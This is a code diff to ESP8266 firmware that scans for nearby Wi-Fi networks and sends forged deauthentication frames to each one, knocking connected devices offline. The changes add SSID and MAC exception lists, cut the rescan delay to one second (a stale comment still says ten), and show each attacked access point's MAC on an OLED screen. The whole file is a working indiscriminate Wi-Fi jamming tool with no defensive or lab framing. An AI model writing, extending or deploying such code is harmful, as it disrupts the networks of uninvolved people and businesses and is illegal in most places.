@@ -18,10 +18,18 @@ const char* ssid_exception_list[] = {
     // Add more SSIDs as needed
 };
 
+// Define your MAC address exception list as strings
+const char* mac_exception_list[] = {
+    "00:14:22:01:23:45", // Example MAC 1
+    // "00:14:22:67:89:AB", // Example MAC 2
+    // // Add more MAC addresses as needed
+};
+
 int num_ssids = sizeof(ssid_exception_list) / sizeof(ssid_exception_list[0]);
+int num_macs = sizeof(mac_exception_list) / sizeof(mac_exception_list[0]);
 
 // Function to check if the SSID is in the exception list
-bool isInExceptionList(const char* ssid) {
+bool isInSsidExceptionList(const char* ssid) {
     for (int i = 0; i < num_ssids; i++) {
         if (strcmp(ssid, ssid_exception_list[i]) == 0) {
             return true;  // SSID found in exception list
@@ -30,8 +38,18 @@ bool isInExceptionList(const char* ssid) {
     return false;  // SSID not found in exception list
 }
 
+// Function to check if the MAC address is in the exception list
+bool isInMacExceptionList(const char* mac) {
+    for (int i = 0; i < num_macs; i++) {
+        if (strcmp(mac, mac_exception_list[i]) == 0) {
+            return true;  // MAC address found in exception list
+        }
+    }
+    return false;  // MAC address not found in exception list
+}
+
 // Declare the deauthAttack function
-void deauthAttack(uint8_t* bssid, const char* ssid);
+void deauthAttack(uint8_t* bssid, const char* ssid, const char* mac_str);
 
 // Initialize the display using software I2C with specified pins
 U8G2_SSD1306_128X64_NONAME_F_SW_I2C u8g2(U8G2_R0, /* clock=*/ 12, /* data=*/ 14, /* reset=*/ U8X8_PIN_NONE);
@@ -107,27 +125,31 @@ void loop(void) {
       // Get BSSID of the network
       uint8_t* bssid = WiFi.BSSID(i);
       Serial.print("BSSID: ");
-      for (int j = 0; j < 6; j++) {
-        Serial.print(bssid[j], HEX);
-        if (j < 5) Serial.print(':');
-      }
-      Serial.println();
-      
+      char bssid_str[18];
+      sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
+      Serial.println(bssid_str);
+
       const char* ssid_char = ssid.c_str();
-      deauthAttack(bssid, ssid_char);
+      deauthAttack(bssid, ssid_char, bssid_str);
 
       if (i == 3) break; // Only display the first 3 networks to fit the screen
     }
     u8g2.sendBuffer();
   }
-  delay(10000); // Wait for 10 seconds before scanning again
+  delay(1000); // Wait for 10 seconds before scanning again
 }
 
-void deauthAttack(uint8_t* bssid, const char* ssid) {
-   // Check if the SSID is in the exception list
-  if (isInExceptionList(ssid)) {
-      // SSID is in the exception list, do not send deauthentication packets
-      return;
+void deauthAttack(uint8_t* bssid, const char* ssid, const char* mac_str) {
+  // Check if the SSID is in the exception list
+  if (isInSsidExceptionList(ssid)) {
+    // SSID is in the exception list, do not send deauthentication packets
+    return;
+  }
+
+  // Check if the BSSID is in the exception list
+  if (isInMacExceptionList(mac_str)) {
+    // BSSID is in the exception list, do not send deauthentication packets
+    return;
   }
 
   // Frame construction for deauthentication
@@ -145,4 +167,15 @@ void deauthAttack(uint8_t* bssid, const char* ssid) {
     wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
     delay(10);
   }
+
+  // Log the deauthenticated MAC address
+  Serial.print("Deauthenticated MAC: ");
+  Serial.println(mac_str);
+
+  // Display the deauthenticated MAC address on OLED
+  u8g2.clearBuffer();
+  u8g2.setFont(u8g2_font_profont10_mr); // Set a small font (profont10_mr)
+  u8g2.drawStr(0, 30, "Deauth MAC:");
+  u8g2.drawStr(0, 40, mac_str);
+  u8g2.sendBuffer();
 }
